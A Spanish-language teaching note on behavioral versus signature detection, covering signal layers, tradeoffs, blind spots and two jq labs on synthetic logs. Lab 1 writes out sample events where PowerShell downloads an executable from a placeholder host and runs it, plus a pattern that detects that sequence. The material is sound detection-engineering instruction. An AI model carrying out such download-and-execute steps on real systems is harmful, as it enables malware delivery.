# Behavioral Detection vs Signature Detection

## Definición

La detección de comportamiento identifica actividad por lo que un actor o sistema hace a lo largo del tiempo, mientras que la detección por firma identifica artefactos conocidos, patrones de bytes, strings, hashes, formas de protocolo o eventos que coinciden con reglas.

## Por qué importa

La madurez de la detección se mueve del matching de artefactos hacia el modelado de comportamiento, pero la buena ingeniería sigue usando ambos. Las firmas son rápidas, explicables y útiles para actividad maliciosa conocida. Las analíticas de comportamiento detectan adaptación, actividad living-off-the-land y secuencias de ataque que no llevan indicadores estáticos estables.

La trampa es tratar un modelo como moralmente superior. La detección solo por firmas falla cuando los artefactos cambian. La detección solo por comportamiento falla cuando el comportamiento es común, ambiguo o carece de contexto. Los EDR, IDS, SIEM, XDR y detecciones cloud modernos mezclan ambos: un indicador estático puede iniciar la investigación, pero el comportamiento y el contexto deciden si importa.

## Cómo funciona

La lógica de detección tiene **5 capas de señal**:

1. **Indicadores estáticos.** Hashes, IPs, dominios, nombres de archivo, user agents, fingerprints de certificados, valores JA3/JA4, strings YARA y firmas Suricata.
2. **IOCs con contexto.** Artefactos estáticos unidos a rol del asset, tiempo de primera aparición, reputación, prevalencia, propietario y entorno.
3. **IOAs.** Indicadores de ataque: inyección de procesos, comportamiento de volcado de credenciales, fan-out de escaneo, procesos padre-hijo sospechosos, secuencias inusuales de APIs cloud.
4. **Analíticas de secuencia.** Múltiples eventos en el tiempo: recon luego sondeo de exploit, PowerShell luego fan-out de red, fallos de login luego éxito luego exportación de buzón.
5. **Anomalía basada en modelos.** Comportamiento comparado contra una baseline: proceso padre raro, destino nuevo para una service account, ratio de bytes anormal, protocolo nunca visto desde una subred.

Ejemplo:

```
Firma: bloquear SHA256 abc123.
Comportamiento: powershell.exe descarga contenido, escribe un ejecutable, lo inicia, luego abre 200 conexiones salientes.
Híbrido: el mismo comportamiento más hash de baja prevalencia y binario sin firmar aumenta la confianza.
```

La detección es más fuerte cuando el artefacto y el comportamiento se refuerzan mutuamente.

## Técnicas / patrones

- **Reglas de firma.** Hacer match de strings conocidos, hashes, campos de protocolo, payloads de paquetes, fragmentos de línea de comandos o estructura de archivos.
- **Reglas heurísticas.** Combinar pistas débiles: path sospechoso + binario sin firmar + padre raro + conexión de red.
- **Detección de anomalías.** Comparar actividad contra baselines del host, usuario, subred, aplicación o service account.
- **Detección basada en secuencia.** Detectar cadenas ordenadas: descubrimiento → acceso a credenciales → movimiento lateral → staging de datos.
- **Prevalencia y rareza.** Tratar binarios, destinos, comandos o relaciones padre-hijo raros como características de riesgo, no veredictos.
- **Mapeo de técnicas.** Usar ATT&CK como lenguaje para comportamiento, recordando que el mapeo no es calidad de detección.

## Perspectiva del atacante

Los atacantes pueden cambiar artefactos estáticos barato: recompilar, renombrar, encodear, rotar IPs, cambiar dominios, usar nueva infraestructura o ajustar user agents. Por eso las firmas frágiles envejecen rápido.

El comportamiento es más difícil de cambiar porque el atacante sigue necesitando cumplir objetivos: descubrir, ejecutar, persistir, moverse lateralmente, recolectar, preparar y exfiltrar. Pero los atacantes pueden reducir la claridad del comportamiento usando herramientas admin legítimas, mezclándose en ventanas de mantenimiento, ralentizando actividad, abusando de APIs cloud u operando a través de identidades comprometidas.

## Perspectiva del defensor

Los defensores usan firmas para capturar lo conocidamente malo rápido y el comportamiento para detectar la forma del trabajo adversario. El objetivo de ingeniería no es "reemplazar firmas con IA"; es capas de artefacto, comportamiento, contexto y secuencia para que la detección sobreviva adaptación moderada del atacante.

El defensor debe preguntarse:
- ¿Qué puede cambiar el atacante barato?
- ¿Qué debe seguir siendo verdad para que el ataque funcione?
- ¿Qué telemetría prueba ese comportamiento?
- ¿Qué actividad benigna se ve similar?
- ¿Qué campos hacen posible el triage?

## Tradeoffs de detección e ingeniería

1.
**Precisión de firma vs adaptabilidad.**
   Las firmas estáticas pueden ser precisas cuando el artefacto es raro y malicioso. Son débiles cuando el artefacto muta rápido o aparece en software benigno.

2.
**Recall de comportamiento vs carga del analista.**
   Los modelos de comportamiento capturan más variantes, pero comportamiento amplio como "PowerShell hizo una conexión de red" es ruidoso sin contexto de rol, padre, comando y destino.

3.
**Heurísticas vs explicabilidad.**
   Las heurísticas ponderadas pueden expresar razonamiento real del analista, pero la regla debe explicar por qué el evento es sospechoso.

4.
**Mapeo ATT&CK vs calidad de producción.**
   ATT&CK ayuda a nombrar el comportamiento adversario y las fuentes de datos necesarias. No prueba que una regla sea precisa, completa o lista para triage.

5.
**Baselines del entorno vs portabilidad.**
   Una detección ajustada para un domain controller puede fallar en una laptop de desarrollador. La lógica portable necesita hooks de contexto local.

## Detección y defensa

Ordenado por efectividad:

1.
**Usá firmas para lo conocidamente malo estable y límites de política.**
   Los hashes, dominios, firmas de paquetes y fragmentos de comandos son útiles cuando identifican actividad específica con baja ambigüedad.

2.
**Usá comportamiento para objetivos del atacante.**
   El descubrimiento, acceso a credenciales, escalada de privilegios, movimiento lateral, persistencia y exfiltración tienen formas operacionales que sobreviven a las herramientas individuales.

3.
**Uní comportamiento a contexto de asset e identidad.**
   El mismo comando significa cosas diferentes en una workstation de helpdesk, domain controller, CI runner o scanner aprobado.

4.
**Escribí detecciones como hipótesis.**
   Cada detección debe decir qué comportamiento representa, qué telemetría requiere, qué falsos positivos se esperan y qué evidencia debe inspeccionar el analista.

5.
**Mantené las capas estática y de comportamiento testeables.**
   Los eventos de regresión deben probar que cambiar un hash no bypasea la regla de comportamiento, y que el comportamiento admin benigno no inunda la cola.

### Qué no funciona como defensa primaria

- **Solo bloqueo de hashes.** La recompilación, reempaquetado y cambios de script hacen frágil la detección solo por hash.
- **Solo matching de palabras clave en comandos.** Los atacantes pueden encodear, usar alias o reordenar comandos; los defensores igual necesitan proceso, padre, destino y secuencia.
- **Reglas de solo comportamiento sin contexto.** Se convierten en fábricas de alertas cuando la administración normal se parece al comportamiento adversario.
- **Solo dashboards de cobertura ATT&CK.** Una regla mapeada puede seguir siendo ruidosa, faltar telemetría requerida o ser imposible de triagear.
- **"La IA inferirá la intención."** Los modelos no pueden recuperar campos faltantes, timestamps rotos o joins de entidades incorrectos.

### Misconceptions operacionales

- **"Las firmas son obsoletas."** Siguen siendo valiosas para infraestructura maliciosa conocida, exploit kits, familias de malware, violaciones de política y tests de regresión.
- **"La detección de comportamiento captura todo."** El comportamiento puede ser común, ambiguo, de baja señal o ausente de la telemetría recolectada.
- **"Living off the land es invisible."** Frecuentemente es visible como parentesco inusual, línea de comandos, elección de objetivo, frecuencia o contexto de identidad.
- **"Los IOCs son mala detección."** Los IOCs son débiles solos; son útiles como enriquecimiento, pivotes y artefactos de alta confianza cuando son raros.

### Limitaciones modernas

- Las APIs cloud, logs SaaS, contenedores y plataformas de identidad exponen diferentes campos de comportamiento que el EDR de host.
- Los controles de privacidad y el cifrado reducen la inspección de payload, desplazando el valor hacia metadata y contexto de endpoint/proceso.
- Los atacantes pueden operar lo suficientemente lento para que la lógica de secuencia necesite ventanas más largas y mejores baselines.
- Los modelos de comportamiento se desvían a medida que los entornos cambian.

### Puntos ciegos de telemetría

- Líneas de comandos faltantes, bloques de script truncados, eventos de proceso deshabilitados, metadata DNS/TLS ausente.
- Dispositivos no administrados y appliances sin telemetría de endpoint.
- Infraestructura NAT/proxy que oculta actores originales.
- Pipelines SIEM que normalizan descartando los campos necesarios para distinguir comportamiento benigno de malicioso.

## Labs prácticos

Ejecutar solo con datos locales generados.

### Lab 1 — Comparar lógica de IOC y comportamiento

Objetivo: mostrar por qué el matching de artefactos y el modelado de comportamiento responden preguntas diferentes.

```
cat > /tmp/detect-events.jsonl <<'EOF'
{"ts":"2026-05-11T10:00:00Z","host":"dev-1","process":"powershell.exe","parent":"explorer.exe","cmd":"Invoke-WebRequest http://example.test/a.exe -OutFile a.exe","hash":"good111","dest":"example.test"}
{"ts":"2026-05-11T10:00:05Z","host":"dev-1","process":"a.exe","parent":"powershell.exe","cmd":"a.exe","hash":"bad999","dest":"10.0.0.5:443"}
{"ts":"2026-05-11T10:02:00Z","host":"dev-2","process":"powershell.exe","parent":"explorer.exe","cmd":"iwr http://example.test/b.exe -OutFile b.exe","hash":"new222","dest":"example.test"}
{"ts":"2026-05-11T10:02:05Z","host":"dev-2","process":"b.exe","parent":"powershell.exe","cmd":"b.exe","hash":"new222","dest":"10.0.0.5:443"}
EOF
jq 'select(.hash=="bad999")' /tmp/detect-events.jsonl
jq -s 'group_by(.host)[] | select(any(.[]; .process=="powershell.exe" and (.cmd|test("Invoke-WebRequest|iwr"))) and any(.[]; .parent=="powershell.exe" and .dest=="10.0.0.5:443"))' /tmp/detect-events.jsonl
```

Telemetría esperada: la regla de hash solo captura `bad999`; la secuencia de comportamiento captura ambos hosts. Los defensores verían que cambiar el artefacto no cambió la secuencia. Limitación: datos de juguete sin descargas admin benignas. Misconception corregida: "hash nuevo significa invisible."

### Lab 2 — Testear ambigüedad de living-off-the-land

Objetivo: separar uso sospechoso de herramientas del uso esperado de administración.

```
cat > /tmp/lotl.jsonl <<'EOF'
{"host":"admin-jump","user":"it-admin","process":"powershell.exe","parent":"conhost.exe","cmd":"Test-NetConnection dc1 -Port 445","approved":true}
{"host":"finance-7","user":"alice","process":"powershell.exe","parent":"winword.exe","cmd":"Test-NetConnection 10.0.0.1 -Port 445","approved":false}
EOF
jq 'select(.process=="powershell.exe" and .cmd|test("Test-NetConnection")) | {host,user,parent,approved}' /tmp/lotl.jsonl
```

Telemetría esperada: ambos eventos coinciden con el comportamiento, pero el contexto cambia la severidad. Limitación: las baselines reales necesitan enriquecimiento de asset e identidad. Misconceptions corregidas: "el uso de PowerShell es siempre malicioso" y "el uso de PowerShell es invisible."

## Ejemplos prácticos

- Suricata hace match de una URI de exploit conocida, mientras el EDR muestra si un proceso luego lanzó una shell.
- Una alerta de hash de malware tiene bajo valor hasta conocer la prevalencia, firmante, path y proceso padre.
- Una service account cloud llamando una API rara es sospechosa incluso sin IP maliciosa ni IOC de dominio.
- La detección del user-agent NSE de Nmap es una firma; el fan-out de escaneo más la ancestría del proceso es comportamental.

## Notas relacionadas

- [[ids-ips-and-behavioral-detection-pipelines]]
- [[false-positives-false-negatives-and-detection-tradeoffs]]
- [[telemetry-normalization-correlation-and-enrichment]]
- [[attack-path-correlation-and-kill-chain-observability]]
- [[edr-network-observability-and-process-correlation]]
- [[scan-anomaly-detection-and-fingerprint-analysis]]
- [[cloaking-and-security-evasion|Cloaking and Security Evasion]]

## Referencias

- **Fundamental:** MITRE ATT&CK Data Sources — https://attack.mitre.org/datasources/
- **Fundamental:** MITRE ATT&CK Detection Strategies — https://attack.mitre.org/detectionstrategies/
- **Docs Oficiales:** Suricata EVE JSON Output — https://docs.suricata.io/en/latest/output/eve/eve-json-output.html
- **Esquema de Telemetría:** Microsoft Defender XDR DeviceProcessEvents — https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table
